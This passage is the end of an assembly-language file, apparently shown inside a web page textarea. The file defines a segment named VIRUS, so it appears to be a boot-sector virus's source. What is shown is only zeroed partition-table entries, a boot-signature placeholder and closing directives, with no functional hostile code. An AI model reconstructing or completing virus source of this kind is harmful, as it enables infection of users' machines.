                DB      16 dup (0)              ;partition 3 entry
                DB      16 dup (0)              ;partition 4 entry


                DB      0,0                     ;usually 55 AA boot sec ID

VIRUS           ENDS

                END     START


</textarea></td></tr></table></body></html>
